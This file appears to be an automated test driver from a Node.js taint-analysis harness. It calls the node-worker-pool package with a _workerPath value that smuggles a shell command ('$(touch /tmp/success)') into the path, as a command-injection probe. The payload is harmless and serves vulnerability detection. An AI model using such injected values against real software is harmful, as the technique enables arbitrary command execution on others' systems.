// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/node-worker-pool/node_modules/node-worker-pool');
try {
	var x0 = true;
var x1 = false;
var x2 = true;
var x3 = {"_workerPath":" $(touch /tmp/success);#"};
new PUT(x0,x1,x2,x3)();
} catch (e) {
	console.log(e);
}